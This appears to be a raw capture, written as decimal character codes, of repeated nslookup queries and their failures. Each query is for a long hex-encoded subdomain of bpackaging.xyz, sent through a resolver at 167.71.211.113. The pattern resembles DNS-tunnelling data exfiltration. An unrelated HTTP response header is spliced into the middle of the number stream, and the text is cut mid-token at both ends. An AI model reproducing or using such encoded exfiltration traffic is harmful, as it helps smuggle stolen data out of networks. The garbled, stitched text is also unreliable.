98 108 101 32 102 111 114 32 54 48 68 55 49 53 49 65 66 48 54 52 69 70 49 68 49 65 65 49 55 69 57 68 68 70 49 49 66 49 68 65 54 67 56 57 67 65 53 55 48 67 66 67 50 48 56 68 67 53 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 52 49 70 52 51 51 66 49 56 67 49 66 69 69 51 69 67 50 49 57 57 56 48 48 68 48 67 48 50 50 54 52 48 57 68 51 51 51 69 50 52 54 50 65 67 54 50 55 49 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 70 65 48 53 56 48 53 69 52 68 67 65 52 56 51 57 50 48 57 67 66 49 48 48 65 51 48 70 55 49 49 68 52 48 52 69 52 50 57 67 56 70 66 57 52 69 52 56 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 57 55 57 50 65 57 48 70 65 68 67 53 65 70 66 68 57 50 69 68 49 49 68 54 69 65 68 56 67 70 53 51 54 50 54 66 54 52 51 57 57 65 49 65 65 66 65 57 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 50 67 66 52 54 57 67 48 57 56 55 52 56 48 50 70 53 55 50 53 48 50 55 69 55 67 67 65 66 68 66 69 50 56 56 49 66 52 70 69 56 50 69 56 51 69 49 54 50 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 57 57 68 49 56 54 67 65 48 53 52 67 67 57 69 51 49 70 52 50 53 48 67 55 67 66 70 48 48 49 68 49 48 57 66 49 53 49 66 65 54 53 56 51 56 68 55 51 67 68 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 66 57 66 70 53 49 49 53 48 68 70 56 70 53 49 66 69 68 67 65 66 48 51 51 52 70 51 66 67 69 67 50 56 57 57 48 65 53 56 65 53 70 51 53 56 70 49 65 51 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 54 66 52 49 69 49 55 56 52 56 55 51 50 52 65 66 57 54 56 57 66 56 57 65 50 53 68 65 68 70 49 48 49 66 57 52 51 49 68 65 68 50 50 68 52 68 70 70 68 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 49 67 53 65 57 53 54 50 65 52 70 65 53 67 51 57 67 55 53 54 48 56 55 67 67 55 53 68 48 55 48 56 49 65 53 54 53 56 65 68 69 49 50 50 51 53 51 51 53 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 50 70 49 70 49 53 67 68 65 57 53 66 70 70 70 69 53 65 53 69 57 51 70 55 50 48 57 55 70 50 69 49 54 55 54 70 68 49 49 50 51 52 68 68 55 56 70 66 52 52 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 57 51 70 57 66 49 69 57 54 48 49 49 65 53 53 56 68 70 53 70 69 48 50 69 53 57 56 56 70 53 69 70 69 57 50 54 69 66 67 56 70 69 66 65 69 68 56 53 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 51 55 53 66 56 51 70 69 52 48 50 55 68 48 68 53 70 52 51 65 55 66 53 57 65 54 56 68 68 54 56 68 57 54 53 48 55 49 66 55 52 66 67 55 70 50 56 68 55 54 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 49 54 49 68 55 66 54 67 70 49 65 66 52 53 57 67 48 70 69 49 50 67 50 50 52 68 54 50 65 49 52 54 49 69 65 66 68 65 55 49 65 50 69 57 48 65 53 66 52 52 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 56 50 65 65 52 69 54 50 49 48 55 48 56 50 65 54 70 56 70 65 67 56 48 57 65 54 53 54 69 69 51 66 49 69 53 57 48 56 53 65 50 52 66 48 49 67 53 67 57 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 55 54 57 49 68 48 67 57 69 52 66 65 48 66 70 70 56 52 50 52 68 67 68 54 54 49 52 70 66 56 65 51 51 56 66 53 70 68 65 55 55 57 67 69 52 57 48 68 66 57 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 50 50 48 56 53 56 49 50 55 67 53 65 57 65 70 55 53 54 52 51 49 54 52 54 54 68 70 49 51 56 48 69 65 53 56 51 68 55 51 54 67 57 50 66 68 54 51 49 67 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 55 49 67 48 68 56 57 57 51 54 65 65 66 48 68 51 69 54 54 56 55 49 48 66 49 66 70 65 52 50 65 56 67 54 55 50 56 55 55 53 56 57 48 54 57 48 50 51 68 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 57 57 70 70 55 53 67 70 48 68 53 70 50 51 67 56 68 52 65 66 53 48 50 57 65 65 52 67 66 49 49 65 53 68 52 52 48 54 66 57 57 57 67 55 49 56 68 50 56 70 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 51 65 49 55 56 55 68 55 67 52 68 48 54 70 52 53 48 48 69 53 70 51 56 54 53 67 48 67 55 70 50 68 53 70 50 49 55 52 57 68 57 57 HTTP/1.0 200 OK
Server: Apache/2.4.1 
Date: Fri, 13 Jan 2023 17:34:39 GMT
Access-Control-Allow-Origin: *
Content-Type: text/plain

49 70 55 56 54 56 65 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 53 49 49 65 49 48 51 67 53 51 51 66 69 68 53 51 69 66 51 53 65 51 50 57 51 49 54 48 56 57 53 50 56 49 55 48 53 51 54 52 67 56 51 67 48 56 49 66 54 70 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 56 70 54 53 70 67 68 49 57 54 49 66 54 56 65 67 70 70 69 70 69 52 56 49 50 53 57 67 54 50 55 57 65 57 69 68 54 68 50 51 50 56 56 56 48 55 56 67 50 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 54 57 49 53 54 48 56 53 65 52 67 65 50 70 49 52 57 70 68 65 52 53 68 55 54 50 48 57 48 67 53 55 51 68 50 49 66 51 56 68 52 70 69 57 57 70 48 55 49 67 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 55 48 67 67 66 50 66 68 57 56 67 53 50 53 49 54 55 54 65 48 51 70 53 70 65 50 66 49 51 48 49 70 49 55 57 49 67 70 55 51 52 49 53 56 66 51 52 70 69 70 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 50 66 66 52 57 55 50 50 65 70 50 53 57 69 49 56 50 54 49 68 53 53 53 55 70 56 55 70 57 69 66 66 51 50 48 51 66 69 69 65 56 70 69 69 50 70 55 53 49 49 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 65 65 68 49 52 68 48 48 66 66 68 49 68 52 54 56 65 56 69 53 67 53 65 69 65 65 69 56 50 54 69 51 49 67 57 52 49 67 67 69 52 54 57 54 56 49 51 53 69 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 48 52 50 51 69 67 68 68 49 48 50 54 57 57 66 49 50 65 68 56 70 69 57 55 56 53 48 55 56 70 57 65 67 56 68 53 65 68 49 54 66 65 56 67 55 69 55 53 55 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 51 52 50 52 65 49 53 70 57 69 53 54 49 50 70 50 65 52 51 54 56 69 70 66 51 52 48 57 70 54 66 69 49 48 57 57 52 66 48 67 48 70 55 67 50 54 70 52 57 68 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 67 54 55 55 57 49 70 55 65 49 50 51 69 57 68 56 53 67 65 67 55 49 66 51 50 49 54 51 65 49 53 70 53 49 48 53 66 53 57 65 52 67 50 67 52 48 55 57 50 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 52 51 67 49 70 53 50 55 67 65 50 50 49 52 67 55 52 52 69 50 50 70 70 55 65 57 48 51 57 48 55 50 48 49 68 49 49 69 48 56 51 53 48 69 54 57 65 50 51 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 68 53 49 48 69 49 66 65 57 68 55 69 69 56 53 55 55 52 54 50 50 54 67 67 56 56 53 53 48 65 48 52 65 53 55 69 56 51 68 70 68 52 70 54 50 55 51 55 50 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 54 69 67 68 56 68 50 55 68 49 67 57 67 48 48 53 70 67 49 50 56 51 49 70 65 65 51 52 67 57 55 68 69 68 52 65 49 49 55 53 68 57 66 69 69 50 56 56 57 52 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 70 67 68 49 56 66 53 67 48 49 48 69 69 48 50 51 53 55 68 65 50 55 53 55 66 53 52 65 68 70 50 70 66 48 66 66 69 69 53 50 50 48 54 70 67 67 55 51 48 54 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 66 65 52 57 49 68 68 70 55 54 70 57 52 55 50 69 48 56 48 53 66 69 70 55 50 68 70 68 67 51 56 67 66 65 67 70 52 53 51 52 48 68 49 55 52 52 55 70 66 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 66 56 53 51 53 49 54 70 68 51 51 66 49 68 49 54 54 56 55 49 66 51 49 54 51 50 53 68 66 48 69 65 49 53 54 48 70 49 52 68 66 50 49 55 70 49 51 49 52 70 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 67 70 53 52 50 56 48 68 50 54 56 55 70 69 55 56 49 49 53 56 56 66 69 66 55 49 70 69 68 68 48 48 56 67 49 65 69 70 69 52 54 69 51 65 70 68 55 49 66 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 66 57 50 49 69 55 70 51 49 49 70 52 52 70 53 55 48 68 56 53 70 68 48 57 70 70 65 66 51 68 70 50 53 53 66 51 53 48 68 52 49 49 48 66 57 70 48 70 69 53 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 55 54 70 56 54 52 70 50 65 56 65 52 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 49 46 49 49 51 13 10 13 10 83 101 114 118 101 114 58 32 32 85 110 75 110 111 119 110 13 10 65 100 100 114 101 115 115 58 32 32 49 54 55 46 55 49 46 50 49 